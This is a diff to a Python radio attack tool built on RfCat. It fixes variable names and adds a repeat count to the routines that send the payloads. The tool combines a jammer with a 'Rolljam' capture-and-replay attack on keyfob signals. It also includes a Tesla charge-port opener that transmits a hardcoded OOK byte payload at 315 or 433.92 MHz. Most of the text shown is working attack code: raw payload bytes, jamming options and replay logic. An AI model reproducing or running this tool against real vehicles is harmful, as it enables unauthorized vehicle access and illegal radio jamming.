@@ -42,9 +42,9 @@ def main():
     rpitxJ = args.rpitx_jammer
     ysJ = args.yardstick_jammer
     country = args.tesla_port
-    
-    if teslaPort != None:
-        teslaPortOpener(country)
+
+    if country != None:
+        teslaPortOpener(country, number)
         print("[*] Tesla Port should be Opened Boss ;)\n")
         exit(0)
 
@@ -136,7 +136,7 @@ def main():
             input("[ENTER TO SEND PAYLOAD]")
         print("[*] Rolljam enabled, so only sending first capture..\n")
         d.makePktFLEN(len(payloads[0]))
-        d.RFxmit(payloads[0] + emtpyKey * number)
+        d.RFxmit(payloads[0] + emptyKey * number)
         print("[PACKET SENT] Payload transmittion completed..\n")
 
         input("[ENTER TO SEND OTHER PAYLOAD]")
@@ -168,7 +168,7 @@ def captureSignal(d, minRSSI, maxRSSI, limit, bs):
 #            cap = capture.encode('hex') # for python2
 
             strength = 0 - ord(d.getRSSI())
-            
+
 # Giving issues in terms of not appending the sync and so forth. So commenting it out until then
 #            if (re.search(r'((0)\2{15,})', cap)):
 #                print("[*] Signal Strength: " + str(strength))
@@ -218,7 +218,7 @@ def formatCapture(d, signals):
 
 # Credits to pickeditmate
 # - https://github.com/pickeditmate
-def teslaPortOpener(country):
+def teslaPortOpener(country, number):
     d = RfCat(idx=0)
     d.setMdmModulation(MOD_ASK_OOK)
     if country == 'US':
@@ -226,9 +226,11 @@ def teslaPortOpener(country):
     else:
         d.setFreq(433920000)
     d.setMdmDRate(2500)
+#    d.setMaxPower()
     d.setAmpMode(1)
     print("[*] Sending Payload\n")
-    d.RFxmit((b'\x15\x55\x55\x51\x59\x4C\xB5\x55\x52\xD5\x4B\x4A\xD3\x4C\xAB\x4B\x15\x94\xCB\x33\x33\x2D\x54\xB4\x56\x9A\x65\x5A\x48\xAC\xC6\x59\x99\x99\x69\xA5\xB2\xB4\xD4\x2A\xD2\x80'*5))
+    for x in range(0, number):
+        d.RFxmit(b'\x15\x55\x55\x51\x59\x4C\xB5\x55\x52\xD5\x4B\x4A\xD3\x4C\xAB\x4B\x15\x94\xCB\x33\x33\x2D\x54\xB4\x56\x9A\x65\x5A\x48\xAC\xC6\x59\x99\x99\x69\xA5\xB2\xB4\xD4\x2A\xD2\x80' * 10)
     d.setModeIDLE()
 
 main()
